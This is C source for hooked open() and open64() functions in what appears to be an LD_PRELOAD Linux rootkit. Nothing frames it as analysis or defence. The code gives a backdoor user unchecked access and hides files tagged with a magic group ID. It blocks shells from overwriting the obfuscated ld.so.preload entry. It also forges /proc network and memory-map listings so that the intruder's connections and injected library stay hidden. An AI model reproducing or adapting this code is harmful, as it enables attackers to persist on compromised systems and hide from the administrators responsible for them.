int open(const char *pathname, int flags, mode_t mode)
{
    HOOK(o_open, COPEN);
    if(is_bdusr()) return o_open(pathname, flags, mode);

    char *ldsp=strdup(LDSO_PRELOAD); xor(ldsp);
    if(hxstat(pathname,MGID,32) && strstr(ldsp,pathname))
    {
        if((strstr(cprocname(), "sh") || strstr(cprocname(), "busybox")) &&
            (flags==(64|1|512)))
          CLEAN(ldsp); return o_open("/dev/null", flags, mode);
    }
    CLEAN(ldsp);

    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
      return fileno(forge_procnet(pathname));

    if(!fnmatch("/proc/*/maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
    if(!fnmatch("/proc/*/smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
    if(!fnmatch("/proc/*/numa_maps",pathname,FNM_PATHNAME)) return fileno(forge_numamaps(pathname));

    char cwd[PATH_MAX];
    if(getcwd(cwd, sizeof(cwd)) != NULL)
    {
        if(!strcmp(cwd, "/proc"))
        {
            if(!fnmatch("*/maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch("*/smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch("*/numa_maps",pathname,FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }

        if(!fnmatch("/proc/*",cwd,FNM_PATHNAME))
        {
            if(!fnmatch("maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch("smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch("numa_maps",pathname,FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }
    }

    if(hxstat(pathname,MGID,32)) { errno = ENOENT; return -1; }
    return o_open(pathname, flags, mode);
}

int open64(const char *pathname, int flags, mode_t mode)
{
    HOOK(o_open64, COPEN64);
    if(is_bdusr()) return o_open64(pathname, flags, mode);

    char *ldsp=strdup(LDSO_PRELOAD); xor(ldsp);
    if(hxstat(pathname,MGID,32) && strstr(ldsp,pathname))
    {
        if((strstr(cprocname(), "sh") || strstr(cprocname(), "busybox")) &&
            (flags==(64|1|512)))
          CLEAN(ldsp); return o_open64("/dev/null", flags, mode);
    }
    CLEAN(ldsp);

    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
      return fileno(forge_procnet(pathname));

    if(!fnmatch("/proc/*/maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
    if(!fnmatch("/proc/*/smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
    if(!fnmatch("/proc/*/numa_maps",pathname,FNM_PATHNAME)) return fileno(forge_numamaps(pathname));

    char cwd[PATH_MAX];
    if(getcwd(cwd, sizeof(cwd)) != NULL)
    {
        if(!strcmp(cwd, "/proc"))
        {
            if(!fnmatch("*/maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch("*/smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch("*/numa_maps",pathname,FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }

        if(!fnmatch("/proc/*",cwd,FNM_PATHNAME))
        {
            if(!fnmatch("maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
            if(!fnmatch("smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
            if(!fnmatch("numa_maps",pathname,FNM_PATHNAME)) return fileno(forge_numamaps(pathname));
        }
    }


    if(hxstat(pathname,MGID,32)) { errno = ENOENT; return -1; }
    return o_open64(pathname, flags, mode);
}
